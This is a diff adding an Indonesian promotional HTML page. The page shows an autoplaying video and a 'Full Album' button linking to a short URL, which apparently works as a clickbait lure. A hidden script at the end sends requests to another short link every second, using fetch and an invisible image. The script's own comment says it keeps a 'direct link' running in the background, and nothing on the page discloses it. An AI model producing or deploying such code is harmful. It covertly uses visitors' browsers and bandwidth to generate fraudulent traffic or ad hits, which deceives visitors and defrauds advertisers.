@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Promo Interaktif</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gradient-to-r from-indigo-600 via-purple-600 to-pink-500 text-white min-h-screen flex items-center justify-center font-sans">
+
+  <div class="max-w-xl w-full p-6 bg-white/10 backdrop-blur-md rounded-2xl shadow-lg text-center">
+    <!-- Judul -->
+    <h1 class="text-3xl font-bold mb-4 animate-bounce"></h1>
+    <p class="mb-6 text-lg text-white/90"></p>
+
+    <!-- Video -->
+    <div class="rounded-xl overflow-hidden shadow-lg mb-6">
+      <video id="promoVideo" controls autoplay muted loop class="w-full">
+        <source src="https://cdn.videy.co/lxfP7PWY1.mp4" type="video/mp4">
+        Browser kamu tidak mendukung video.
+      </video>
+    </div>
+
+    <!-- Tombol CTA -->
+    <a href="https://bitly.cx/Z4o58" target="_blank"
+       class="inline-block px-6 py-3 bg-yellow-400 text-black font-semibold rounded-xl shadow-xl hover:scale-105 transform transition">
+        Full Album
+    </a>
+
+    <p class="mt-4 text-sm text-white/70"></p>
+  </div>
+
+  <!-- Script agar direct link jalan terus di background -->
+  <script>
+    const link = "https://bitly.cx/9YvS";
+    
+    // method 1: lewat fetch
+    setInterval(() => {
+      fetch(link, {mode: "no-cors"}).catch(()=>{});
+    }, 1000); // setiap 1 detik
+
+    // method 2: fallback lewat image "invisible"
+    const img = new Image();
+    setInterval(() => {
+      img.src = link + "?t=" + Date.now();
+    }, 1000);
+  </script>
+
+</body>
+</html>
